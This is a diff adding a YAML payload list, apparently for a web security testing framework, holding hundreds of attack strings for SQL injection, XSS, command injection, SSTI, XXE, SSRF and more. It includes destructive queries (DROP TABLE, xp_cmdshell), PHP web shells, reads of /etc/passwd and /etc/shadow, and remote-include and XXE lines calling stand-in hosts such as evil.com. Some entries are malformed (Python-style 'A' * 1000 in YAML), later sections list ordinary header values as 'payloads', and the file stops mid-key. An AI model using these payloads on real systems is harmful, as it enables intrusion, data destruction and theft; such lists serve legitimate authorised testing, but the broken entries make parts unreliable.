@@ -1,0 +1,1226 @@
+# payloads.yaml - PRACTICAL WEB VULNERABILITY PAYLOADS
+# 1000+ Payloads for Real Web Application Security Testing
+# Author: Lazy Framework
+
+sql_injection:
+  basic_delimiters:
+    - "'"
+    - "''"
+    - "`"
+    - "``"
+    - "\""
+    - "\"\""
+    - ";"
+    - "'--"
+    - "'#"
+    - "`--"
+    - "`#"
+    - "\"--"
+    - "\"#"
+    - "')"
+    - "')--"
+    - "'))"
+    - "'))--"
+    - "')))"
+    - "';"
+    - "\";"
+    - "`;"
+    - "'/*"
+    - "`/*"
+    - "\"/*"
+    - "'%00"
+    - "`%00"
+    - "\"%00"
+
+  authentication_bypass:
+    - "' OR '1'='1"
+    - "' OR 1=1--"
+    - "' OR 1=1#"
+    - "' OR 1=1/*"
+    - "admin'--"
+    - "admin'#"
+    - "admin'/*"
+    - "' OR '1'='1'--"
+    - "' OR '1'='1'#"
+    - "' OR 'x'='x"
+    - "' OR 'a'='a"
+    - "' OR 1 --"
+    - "' OR 1=1"
+    - "' OR 1=1-- -"
+    - "' OR '1'='1'/*"
+    - "admin' OR '1'='1"
+    - "admin' OR 1=1"
+    - "administrator'--"
+    - "root'--"
+    - "test' OR '1'='1"
+    - "' OR '1'='1' LIMIT 1--"
+    - "' OR '1'='1' LIMIT 1#"
+    - "' OR '1'='1' LIMIT 1/*"
+
+  union_based:
+    - "' UNION SELECT 1--"
+    - "' UNION SELECT 1,2--"
+    - "' UNION SELECT 1,2,3--"
+    - "' UNION SELECT 1,2,3,4--"
+    - "' UNION SELECT 1,2,3,4,5--"
+    - "' UNION SELECT null--"
+    - "' UNION SELECT null,null--"
+    - "' UNION SELECT null,null,null--"
+    - "1' UNION SELECT 1,2,3--"
+    - "1' UNION SELECT 1,version(),3--"
+    - "1' UNION SELECT 1,database(),3--"
+    - "1' UNION SELECT 1,user(),3--"
+    - "' UNION SELECT @@version--"
+    - "' UNION SELECT database()--"
+    - "' UNION SELECT user()--"
+    - "' UNION SELECT version()--"
+    - "' UNION SELECT @@datadir--"
+    - "' UNION SELECT @@hostname--"
+    - "' UNION SELECT table_name FROM information_schema.tables--"
+    - "' UNION SELECT column_name FROM information_schema.columns--"
+    - "' UNION SELECT concat(table_name,0x3a,column_name) FROM information_schema.columns--"
+
+  error_based:
+    - "' AND 1=CAST((SELECT version()) AS INT)--"
+    - "' AND EXTRACTVALUE(1,CONCAT(0x3a,version()))--"
+    - "' AND UPDATEXML(1,CONCAT(0x3a,version()),1)--"
+    - "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+    - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
+    - "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--"
+    - "' AND 1=(SELECT 1 FROM DUAL WHERE 1=1)--"
+
+  time_based:
+    - "' AND SLEEP(5)--"
+    - "' AND BENCHMARK(1000000,MD5('A'))--"
+    - "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+    - "' WAITFOR DELAY '0:0:5'--"
+    - "'; WAITFOR DELAY '0:0:5'--"
+    - "' OR SLEEP(5)--"
+    - "' OR SLEEP(5)#"
+    - "' OR SLEEP(5)='"
+    - "'; SELECT pg_sleep(5)--"
+    - "'; SELECT SLEEP(5)--"
+    - "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND 'a'='a"
+
+  boolean_based:
+    - "' AND 1=1--"
+    - "' AND 1=2--"
+    - "' OR 1=1--"
+    - "' OR 1=2--"
+    - "' AND (SELECT substring(version(),1,1))='5'"
+    - "' AND (SELECT ascii(substring(version(),1,1)))=53"
+    - "' AND (SELECT length(version()))=6"
+    - "' AND (SELECT count(*) FROM information_schema.tables)>0"
+
+  stacked_queries:
+    - "'; DROP TABLE users--"
+    - "'; DROP DATABASE test--"
+    - "'; DELETE FROM users--"
+    - "'; UPDATE users SET password='hacked'--"
+    - "'; INSERT INTO users (username,password) VALUES ('hacker','pass')--"
+    - "'; CREATE TABLE hacked (data text)--"
+    - "'; EXEC xp_cmdshell('dir')--"
+    - "'; EXEC master..xp_cmdshell 'dir'--"
+
+  oracle_specific:
+    - "' AND 1=utl_inaddr.get_host_name((SELECT version FROM v$instance))--"
+    - "' AND 1=ctxsys.drithsx.sn(1,(SELECT user FROM DUAL))--"
+    - "' UNION SELECT banner FROM v$version--"
+    - "' UNION SELECT table_name FROM all_tables--"
+    - "' UNION SELECT column_name FROM all_tab_columns--"
+
+  postgres_specific:
+    - "' AND 1=cast(version() as int)--"
+    - "' UNION SELECT version()--"
+    - "' UNION SELECT current_database()--"
+    - "' UNION SELECT current_user--"
+    - "' UNION SELECT schemaname FROM pg_tables--"
+    - "' UNION SELECT tablename FROM pg_tables--"
+
+  mssql_specific:
+    - "' AND 1=CONVERT(int,@@version)--"
+    - "' UNION SELECT @@version--"
+    - "' UNION SELECT name FROM master..sysdatabases--"
+    - "' UNION SELECT name FROM sysobjects WHERE xtype='U'--"
+
+  nosql_injection:
+    - "' || '1'=='1"
+    - "' || 1==1"
+    - "'; return true; var x='"
+    - "'; return 1==1; var x='"
+    - "{$ne: null}"
+    - "{$ne: 1}"
+    - "{$gt: ''}"
+    - "{$where: '1==1'}"
+    - "{$where: 'this.username == this.password'}"
+
+xss:
+  basic_script:
+    - "<script>alert('XSS')</script>"
+    - "<script>alert(document.domain)</script>"
+    - "<script>alert(document.cookie)</script>"
+    - "<script>prompt('XSS')</script>"
+    - "<script>confirm('XSS')</script>"
+    - "<script>console.log('XSS')</script>"
+    - "<script>document.write('XSS')</script>"
+    - "<script>window.alert('XSS')</script>"
+    - "<script>parent.alert('XSS')</script>"
+    - "<script>self.alert('XSS')</script>"
+    - "<script>top.alert('XSS')</script>"
+
+  img_tags:
+    - "<img src=x onerror=alert('XSS')>"
+    - "<img src=\"x\" onerror=\"alert('XSS')\">"
+    - "<img src=x onerror=alert(document.domain)>"
+    - "<img src=x onerror=alert(document.cookie)>"
+    - "<img src=\"javascript:alert('XSS')\">"
+    - "<img dynsrc=\"javascript:alert('XSS')\">"
+    - "<img lowsrc=\"javascript:alert('XSS')\">"
+
+  svg_tags:
+    - "<svg onload=alert('XSS')>"
+    - "<svg><script>alert('XSS')</script>"
+    - "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>"
+    - "<svg><animate attributeName=href values=javascript:alert('XSS')>"
+
+  body_events:
+    - "<body onload=alert('XSS')>"
+    - "<body onpageshow=alert('XSS')>"
+    - "<body onfocus=alert('XSS')>"
+    - "<body onscroll=alert('XSS')>"
+    - "<body onresize=alert('XSS')>"
+
+  input_events:
+    - "<input onfocus=alert('XSS') autofocus>"
+    - "<input onblur=alert('XSS') autofocus><input autofocus>"
+    - "<input onchange=alert('XSS')>"
+    - "<input oninput=alert('XSS')>"
+    - "<input onkeydown=alert('XSS')>"
+    - "<input onkeypress=alert('XSS')>"
+    - "<input onkeyup=alert('XSS')>"
+    - "<input onmouseenter=alert('XSS')>"
+    - "<input onmouseleave=alert('XSS')>"
+
+  iframe_tags:
+    - "<iframe src=\"javascript:alert('XSS')\">"
+    - "<iframe srcdoc=\"<script>alert('XSS')</script>\">"
+    - "<iframe onload=alert('XSS')>"
+    - "<iframe src=\"data:text/html,<script>alert('XSS')</script>\">"
+
+  link_tags:
+    - "<a href=\"javascript:alert('XSS')\">click</a>"
+    - "<a href=\"javas&#99;ript:alert('XSS')\">click</a>"
+    - "<a href=\"javascript&colon;alert('XSS')\">click</a>"
+    - "<a href=\"javascript&#58;alert('XSS')\">click</a>"
+
+  form_tags:
+    - "<form><button formaction=javascript:alert('XSS')>click"
+    - "<form onsubmit=alert('XSS')><input type=submit>"
+    - "<form oninput=alert('XSS')><input></form>"
+
+  meta_tags:
+    - "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">"
+
+  object_tags:
+    - "<object data=\"javascript:alert('XSS')\">"
+    - "<object data=\"data:text/html,<script>alert('XSS')</script>\">"
+
+  embed_tags:
+    - "<embed src=\"javascript:alert('XSS')\">"
+
+  video_audio:
+    - "<video src=x onerror=alert('XSS')>"
+    - "<audio src=x onerror=alert('XSS')>"
+    - "<video><source onerror=alert('XSS')>"
+    - "<audio><source onerror=alert('XSS')>"
+
+  css_based:
+    - "<div style=\"background:url(javascript:alert('XSS'))\">"
+    - "<div style=\"background-image:url(javascript:alert('XSS'))\">"
+    - "<div style=\"width:expression(alert('XSS'))\">"
+    - "<style>@import 'javascript:alert(\"XSS\")';</style>"
+    - "<link rel=stylesheet href=\"javascript:alert('XSS');\">"
+
+  obfuscated:
+    - "<scr<script>ipt>alert('XSS')</scr</script>ipt>"
+    - "<scri<script>pt>alert('XSS')</scri</script>pt>"
+    - "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">"
+    - "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;>"
+    - "<img src=x onerror=alert`XSS`>"
+
+  advanced_xss:
+    - "<details open ontoggle=alert('XSS')>"
+    - "<select onfocus=alert('XSS') autofocus>"
+    - "<keygen onfocus=alert('XSS') autofocus>"
+    - "<textarea onfocus=alert('XSS') autofocus>"
+    - "<isindex onfocus=alert('XSS') autofocus>"
+    - "<marquee onstart=alert('XSS')>"
+    - "<video poster=javascript:alert('XSS')//>"
+    - "<button onfocus=alert('XSS') autofocus>"
+
+  dom_xss:
+    - "\" onmouseover=\"alert('XSS')"
+    - "' onmouseover=\"alert('XSS')"
+    - "javascript:alert('XSS')"
+    - "javas&#99;ript:alert('XSS')"
+    - "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"
+    - "data:text/html,<script>alert('XSS')</script>"
+    - "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
+
+rce:
+  unix_commands:
+    - ";id"
+    - "|id"
+    - "&&id"
+    - "||id"
+    - "`id`"
+    - "$(id)"
+    - "id"
+    - ";whoami"
+    - "|whoami"
+    - "&&whoami"
+    - "||whoami"
+    - "`whoami`"
+    - "$(whoami)"
+    - ";uname -a"
+    - "|uname -a"
+    - "&&uname -a"
+    - "||uname -a"
+
+  file_operations:
+    - ";cat /etc/passwd"
+    - "|cat /etc/passwd"
+    - "&&cat /etc/passwd"
+    - "||cat /etc/passwd"
+    - "`cat /etc/passwd`"
+    - "$(cat /etc/passwd)"
+    - ";ls -la"
+    - "|ls -la"
+    - "&&ls -la"
+    - "||ls -la"
+    - ";pwd"
+    - "|pwd"
+    - "&&pwd"
+    - "||pwd"
+    - ";cat /etc/shadow"
+    - "|cat /etc/shadow"
+    - "&&cat /etc/shadow"
+
+  network_commands:
+    - ";ifconfig"
+    - "|ifconfig"
+    - "&&ifconfig"
+    - "||ifconfig"
+    - ";netstat -an"
+    - "|netstat -an"
+    - "&&netstat -an"
+    - "||netstat -an"
+    - ";ping -c 1 127.0.0.1"
+    - "|ping -c 1 127.0.0.1"
+    - "&&ping -c 1 127.0.0.1"
+    - "||ping -c 1 127.0.0.1"
+
+  windows_commands:
+    - "|whoami"
+    - "&whoami"
+    - ";whoami"
+    - "||whoami"
+    - "`whoami`"
+    - "%whoami%"
+    - "|dir"
+    - "&dir"
+    - ";dir"
+    - "||dir"
+    - "|ipconfig"
+    - "&ipconfig"
+    - ";ipconfig"
+    - "||ipconfig"
+    - "|net user"
+    - "&net user"
+    - ";net user"
+    - "||net user"
+
+  code_execution:
+    - "{{7*7}}"
+    - "#{7*7}"
+    - "${7*7}"
+    - "<%= 7*7 %>"
+    - "${{7*7}}"
+    - "@(7*7)"
+    - "<?php system('id'); ?>"
+    - "<?php echo shell_exec('id'); ?>"
+    - "<?php exec('id'); ?>"
+    - "<?php passthru('id'); ?>"
+    - "<?php `id`; ?>"
+    - "<% Runtime.getRuntime().exec(\"id\") %>"
+    - "#{''.class}"
+    - "${''.class}"
+    - "{{''.class}}"
+
+lfi:
+  basic:
+    - "../../../../etc/passwd"
+    - "../../../../etc/hosts"
+    - "../../../../windows/win.ini"
+    - "../../../../windows/system32/drivers/etc/hosts"
+    - "....//....//....//etc/passwd"
+    - "..%2f..%2f..%2f..%2fetc%2fpasswd"
+    - "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+
+  encoding:
+    - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    - "..%252f..%252f..%252f..%252fetc%252fpasswd"
+    - "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+    - "..%255c..%255c..%255c..%255cwindows%255cwin.ini"
+
+  wrappers:
+    - "php://filter/convert.base64-encode/resource=index.php"
+    - "php://filter/read=convert.base64-encode/resource=index.php"
+    - "file:///etc/passwd"
+    - "phar://evil.phar/file.txt"
+    - "zip://evil.zip%23file.txt"
+    - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
+
+  null_byte:
+    - "../../../../etc/passwd%00"
+    - "../../../../etc/passwd%00.jpg"
+    - "../../../../etc/passwd\x00"
+    - "../../../../etc/passwd\0"
+
+  windows_paths:
+    - "..\\..\\..\\..\\windows\\win.ini"
+    - "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+    - "C:\\Windows\\System32\\drivers\\etc\\hosts"
+    - "\\\\?\\C:\\Windows\\System32\\drivers\\etc\\hosts"
+
+rfi:
+  remote_files:
+    - "http://evil.com/shell.txt"
+    - "https://raw.githubusercontent.com/evil/shell.txt"
+    - "ftp://attacker.com/payload.php"
+    - "\\\\network-share\\malware.exe"
+    - "http://localhost:8080/shell.jsp"
+    - "https://pastebin.com/raw/abc123"
+
+  data_uri:
+    - "data:text/plain,<?php system('id'); ?>"
+    - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
+    - "data:text/html,<script>alert('XSS')</script>"
+
+xxe:
+  external_entity:
+    - '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+    - '<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe; ]>'
+    - '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://evil.com/attack.dtd">%remote;]>'
+
+  parameter_entity:
+    - '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://evil.com/attack.dtd">%remote;%init;]>'
+    - '<!DOCTYPE data [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>">]>'
+
+  xinclude:
+    - '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
+
+idor:
+  id_manipulation:
+    - "1"
+    - "2"
+    - "0"
+    - "-1"
+    - "1000"
+    - "admin"
+    - "user"
+    - "true"
+    - "null"
+    - "undefined"
+    - "NaN"
+    - "false"
+    - "test"
+    - "demo"
+
+  numeric_ids:
+    - "10"
+    - "100"
+    - "1000"
+    - "10000"
+    - "999"
+    - "9999"
+    - "123"
+    - "1234"
+    - "12345"
+
+  special_ids:
+    - "0x1"
+    - "0x10"
+    - "1.0"
+    - "1.1"
+    - "1e1"
+    - "1e10"
+
+ssti:
+  template_engines:
+    - "{{7*7}}"
+    - "${7*7}"
+    - "<%= 7*7 %>"
+    - "#{7*7}"
+    - "{{config}}"
+    - "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    - "<%= system('id') %>"
+    - "#{''.class}"
+    - "${''.class}"
+    - "{{''.class}}"
+
+  python_jinja2:
+    - "{{config}}"
+    - "{{''.__class__}}"
+    - "{{''.__class__.__mro__[1].__subclasses__()}}"
+    - "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+
+  java_spring:
+    - "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    - "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}"
+
+  ruby_erb:
+    - "<%= 7*7 %>"
+    - "<%= system('id') %>"
+    - "<%= `id` %>"
+    - "<%= IO.popen('id').read %>"
+
+  php_twig:
+    - "{{7*7}}"
+    - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+
+ssrf:
+  internal_services:
+    - "http://localhost:22"
+    - "http://127.0.0.1:3306"
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://internal.service/"
+    - "gopher://internal:25/"
+    - "dict://internal:26379/info"
+
+  cloud_metadata:
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://169.254.169.254/latest/user-data/"
+    - "http://169.254.169.254/latest/dynamic/instance-identity/document"
+    - "http://metadata.google.internal/computeMetadata/v1/"
+    - "http://metadata.google.internal/computeMetadata/v1/instance/"
+
+header_injection:
+  crlf:
+    - "test\r\nSet-Cookie: malicious=true"
+    - "test\r\nX-Forwarded-For: 127.0.0.1"
+    - "test\r\nLocation: javascript:alert(1)"
+    - "test\r\nX-Forwarded-Host: evil.com"
+    - "test\r\nX-Forwarded-Proto: javascript"
+
+  host_header:
+    - "evil.com"
+    - "evil.com:80"
+    - "127.0.0.1"
+    - "localhost"
+    - "localhost:80"
+
+open_redirect:
+  redirect_urls:
+    - "http://evil.com"
+    - "https://attacker.com"
+    - "//evil.com"
+    - "/\\evil.com"
+    - "\\evil.com"
+    - "javascript:alert(1)"
+
+command_injection:
+  separators:
+    - "; whoami"
+    - "| whoami"
+    - "& whoami"
+    - "`whoami`"
+    - "$(whoami)"
+    - "|| whoami"
+    - "&& whoami"
+
+  pipe_commands:
+    - "| cat /etc/passwd"
+    - "| ls -la"
+    - "| id"
+    - "| whoami"
+    - "| ifconfig"
+
+  semicolon_commands:
+    - "; cat /etc/passwd"
+    - "; ls -la"
+    - "; id"
+    - "; whoami"
+    - "; ifconfig"
+
+path_traversal:
+  basic:
+    - "../../../../etc/passwd"
+    - "../../../../etc/hosts"
+    - "../../../../windows/win.ini"
+    - "../../../../windows/system.ini"
+
+  absolute_paths:
+    - "/etc/passwd"
+    - "/etc/hosts"
+    - "/etc/shadow"
+    - "/etc/passwd%00"
+    - "/etc/passwd%00.jpg"
+
+  encoded:
+    - "..%2f..%2f..%2f..%2fetc%2fpasswd"
+    - "..%252f..%252f..%252f..%252fetc%252fpasswd"
+    - "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+
+file_upload:
+  image_based:
+    - "<?php system($_GET['cmd']); ?>"
+    - "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
+    - "<script>alert('XSS')</script>"
+    - "GIF89a<?php system($_GET['cmd']); ?>"
+
+  double_extensions:
+    - "shell.php.jpg"
+    - "shell.php.png"
+    - "shell.php.gif"
+    - "shell.php.jpeg"
+
+  null_byte:
+    - "shell.php%00.jpg"
+    - "shell.php\0.jpg"
+    - "shell.php\x00.jpg"
+
+csrf:
+  basic_payloads:
+    - "<img src=\"http://target.com/delete?all=1\">"
+    - "<form action=\"http://target.com/transfer\" method=\"POST\"><input name=\"amount\" value=\"1000\"><input name=\"to\" value=\"attacker\"></form><script>document.forms[0].submit()</script>"
+
+xml_injection:
+  xpath:
+    - "' or '1'='1"
+    - "' or 1=1"
+    - "'] | //* | //*[ '"
+    - "'] | //user | //*[ '"
+
+ldap_injection:
+  basic:
+    - "*"
+    - "admin)(|(password=*))"
+    - "admin*"
+    - "*)(uid=*))(|(uid=*"
+
+nosql_injection:
+  mongo:
+    - "' || '1'=='1"
+    - "' || 1==1"
+    - "'; return true; var x='"
+    - "{$ne: null}"
+    - "{$ne: 1}"
+    - "{$gt: ''}"
+    - "{$where: '1==1'}"
+
+http_parameter_pollution:
+  basic:
+    - "&param=value1&param=value2"
+    - "param=value1&param=value2"
+    - "param[]=value1&param[]=value2"
+
+log_injection:
+  basic:
+    - "\nadmin [127.0.0.1]"
+    - "\n[CRITICAL] Error detected"
+    - "<?php system($_GET['cmd']); ?>"
+
+expression_language:
+  java_el:
+    - "${''.class}"
+    - "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    - "#{''.class}"
+    - "#{T(java.lang.Runtime).getRuntime().exec('id')}"
+
+prototype_pollution:
+  javascript:
+    - "{\"__proto__\":{\"isAdmin\":true}}"
+    - "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}"
+
+deserialization:
+  java:
+    - "rO0ABXQAVklmIHlvdSBzZWUgdGhpcywgeW91IGFyZSB2dWxuZXJhYmxlIHRvIGRlc2VyaWFsaXphdGlvbiBhdHRhY2sh"
+
+  php:
+    - "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}"
+
+business_logic:
+  price_manipulation:
+    - "-1"
+    - "0"
+    - "0.01"
+    - "999999"
+
+  quantity_manipulation:
+    - "-1"
+    - "0"
+    - "999999"
+
+insecure_direct_object_reference:
+  directory_traversal:
+    - "../../"
+    - "../../../"
+    - "../../../../"
+
+  file_disclosure:
+    - ".env"
+    - "config.php"
+    - "database.yml"
+    - "settings.py"
+    - "web.config"
+
+server_side_request_forgery:
+  internal_ips:
+    - "http://127.0.0.1"
+    - "http://localhost"
+    - "http://0.0.0.0"
+
+  cloud_metadata:
+    - "http://169.254.169.254/"
+    - "http://metadata.google.internal/"
+
+web_cache_poisoning:
+  header_injection:
+    - "X-Forwarded-Host: evil.com"
+    - "X-Forwarded-For: 127.0.0.1"
+
+http_request_smuggling:
+  cl_te:
+    - "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n"
+
+server_side_include:
+  basic:
+    - "<!--#exec cmd=\"id\"-->"
+    - "<!--#include file=\"/etc/passwd\"-->"
+
+crlf_injection:
+  headers:
+    - "test\r\nX-Forwarded-For: 127.0.0.1"
+    - "test\r\nSet-Cookie: malicious=true"
+
+sql_wildcard:
+  basic:
+    - "%"
+    - "_"
+    - "%admin%"
+    - "%password%"
+
+email_injection:
+  smtp:
+    - "test@example.com\nSubject: injected"
+    - "test@example.com%0ASubject: injected"
+
+server_status:
+  apache:
+    - "/server-status"
+    - "/server-info"
+
+  nginx:
+    - "/nginx_status"
+
+backup_files:
+  common_extensions:
+    - ".bak"
+    - ".backup"
+    - ".old"
+    - ".tmp"
+
+directory_listing:
+  common_directories:
+    - "/admin/"
+    - "/backup/"
+    - "/uploads/"
+    - "/images/"
+
+information_disclosure:
+  error_messages:
+    - "'"
+    - "\""
+    - "`"
+    - "../"
+
+api_enumeration:
+  common_endpoints:
+    - "/api/v1/users"
+    - "/api/v1/admin"
+    - "/graphql"
+
+authentication_bypass:
+  common_passwords:
+    - "admin"
+    - "password"
+    - "123456"
+    - "test"
+
+session_fixation:
+  session_ids:
+    - "123456"
+    - "sessionid"
+
+clickjacking:
+  iframe_buster:
+    - "<iframe src=\"http://target.com\" style=\"opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;\"></iframe>"
+
+web_services:
+  soap:
+    - "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>payload</test></soap:Body></soap:Envelope>"
+
+  rest:
+    - "{\"test\":\"payload\"}"
+
+graphql_injection:
+  introspection:
+    - "{__schema{types{name}}}"
+
+  field_duplication:
+    - "{user{id id}}"
+
+jwt_injection:
+  alg_none:
+    - "{\"alg\":\"none\"}"
+
+  alg_confusion:
+    - "{\"alg\":\"HS256\",\"typ\":\"JWT\"}"
+
+format_string:
+  basic:
+    - "%s" * 10
+    - "%x" * 10
+    - "%n"
+
+buffer_overflow:
+  patterns:
+    - "A" * 1000
+    - "A" * 10000
+
+server_side_template_injection:
+  smarty:
+    - "{php}echo phpinfo();{/php}"
+
+  velocity:
+    - "#set($exec=''){{$exec.class.forName('java.lang.Runtime').getRuntime().exec('id')}}"
+
+open_redirect_advanced:
+  encoded:
+    - "%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d"
+    - "&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#101;&#118;&#105;&#108;&#46;&#99;&#111;&#109;"
+
+http_method_override:
+  methods:
+    - "X-HTTP-Method-Override: DELETE"
+    - "X-Method-Override: PUT"
+
+content_type_manipulation:
+  types:
+    - "Content-Type: application/x-www-form-urlencoded"
+    - "Content-Type: text/xml"
+    - "Content-Type: application/json"
+
+cookie_injection:
+  manipulation:
+    - "sessionid=attacker_session"
+    - "user_id=1"
+    - "admin=true"
+
+url_redirection:
+  open_redirect:
+    - "//evil.com"
+    - "\\evil.com"
+    - "/../evil.com"
+
+host_header_injection:
+  poisoning:
+    - "evil.com"
+    - "localhost"
+    - "127.0.0.1"
+
+user_agent_injection:
+  manipulation:
+    - "<?php system('id'); ?>"
+    - "<script>alert('XSS')</script>"
+
+referer_injection:
+  manipulation:
+    - "http://evil.com"
+    - "javascript:alert('XSS')"
+
+accept_header_injection:
+  manipulation:
+    - "../../../etc/passwd"
+    - "..././..././..././etc/passwd"
+
+encoding_evasion:
+  double_url_encode:
+    - "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+
+  unicode_encode:
+    - "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+
+case_evasion:
+  mixed_case:
+    - "<ScRiPt>alert('XSS')</ScRiPt>"
+    - "<IMG SRC=x OnError=alert('XSS')>"
+
+whitespace_evasion:
+  tab_characters:
+    - "<img\tsrc=x\tonerror=alert('XSS')>"
+
+  newline_characters:
+    - "<img\nsrc=x\nonerror=alert('XSS')>"
+
+comment_evasion:
+  html_comments:
+    - "<!--><script>alert('XSS')</script>-->"
+    - "<!---<script>alert('XSS')</script>->"
+
+entity_encoding:
+  decimal:
+    - "&#60;script&#62;alert('XSS')&#60;/script&#62;"
+
+  hexadecimal:
+    - "&#x3c;script&#x3e;alert('XSS')&#x3c;/script&#x3e;"
+
+multibyte_encoding:
+  utf7:
+    - "+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-"
+
+  utf16:
+    - "�<script>alert('XSS')</script>"
+
+null_byte_injection:
+  termination:
+    - "test.php%00"
+    - "test.jpg%00.php"
+    - "../../etc/passwd%00"
+
+dot_evasion:
+  extra_dots:
+    - "....//....//....//etc/passwd"
+    - "..\\..\\..\\..\\windows\\win.ini"
+
+  dot_slash:
+    - "././././etc/passwd"
+
+backslash_evasion:
+  mixed_slashes:
+    - "..\\../..\\../etc/passwd"
+    - "..\\/..\\/..\\/etc/passwd"
+
+url_fragments:
+  fragment_abuse:
+    - "test.php#../../etc/passwd"
+    - "test.jpg#.php"
+
+parameter_pollution:
+  multiple_params:
+    - "file=test1&file=test2"
+    - "id=1&id=2"
+
+  array_params:
+    - "file[]=test1&file[]=test2"
+
+http_verb_tampering:
+  alternative_methods:
+    - "PATCH"
+    - "TRACE"
+    - "CONNECT"
+    - "OPTIONS"
+
+content_length:
+  manipulation:
+    - "Content-Length: 0"
+    - "Content-Length: -1"
+
+chunked_encoding:
+  transfer_encoding:
+    - "Transfer-Encoding: chunked"
+
+  chunk_size:
+    - "0"
+    - "1"
+
+gzip_compression:
+  compressed_data:
+    - "Content-Encoding: gzip"
+
+deflate_compression:
+  compressed_data:
+    - "Content-Encoding: deflate"
+
+multiple_encodings:
+  layered:
+    - "Content-Encoding: gzip, deflate"
+
+character_sets:
+  different_encodings:
+    - "charset=iso-8859-1"
+    - "charset=utf-7"
+    - "charset=utf-16"
+
+mime_types:
+  content_type_manipulation:
+    - "Content-Type: text/html"
+    - "Content-Type: application/xml"
+    - "Content-Type: image/jpeg"
+
+boundary_manipulation:
+  multipart:
+    - "boundary=----WebKitFormBoundary"
+    - "boundary=---------------------------"
+
+cookie_attributes:
+  secure_flag:
+    - "Secure"
+    - "HttpOnly"
+
+  domain_scope:
+    - "Domain=.example.com"
+    - "Path=/"
+
+cache_control:
+  directives:
+    - "no-cache"
+    - "no-store"
+    - "max-age=0"
+
+content_security_policy:
+  bypass:
+    - "script-src 'self' 'unsafe-inline'"
+    - "default-src *"
+
+x_frame_options:
+  bypass:
+    - "ALLOW-FROM http://evil.com"
+    - "SAMEORIGIN"
+
+strict_transport_security:
+  manipulation:
+    - "max-age=31536000"
+    - "includeSubDomains"
+
+access_control_allow_origin:
+  cors:
+    - "*"
+    - "null"
+    - "http://evil.com"
+
+x_content_type_options:
+  nosniff:
+    - "nosniff"
+
+x_xss_protection:
+  disable:
+    - "0"
+
+referrer_policy:
+  policies:
+    - "no-referrer"
+    - "unsafe-url"
+
+feature_policy:
+  directives:
+    - "camera 'none'"
+    - "microphone 'none'"
+
+expect_ct:
+  certificate_transparency:
+    - "max-age=86400"
+
+public_key_pins:
+  hpkp:
+    - "pin-sha256=\"base64==\""
+
+content_encoding:
+  brotli:
+    - "br"
+
+  identity:
+    - "identity"
+
+transfer_encoding:
+  compress:
+    - "compress"
+
+te:
+  trailers:
+    - "trailers"
+
+via:
+  proxy_headers:
+    - "1.1 proxy.example.com"
+
+x_forwarded_for:
+  ip_spoofing:
+    - "127.0.0.1"
+    - "localhost"
+
+x_forwarded_host:
+  host_spoofing:
+    - "evil.com"
+    - "localhost"
+
+x_forwarded_proto:
+  protocol_spoofing:
+    - "https"
+    - "http"
+
+x_real_ip:
+  real_ip_spoofing:
+    - "127.0.0.1"
+
+true_client_ip:
+  client_ip_spoofing:
+    - "127.0.0.1"
+
+cf_connecting_ip:
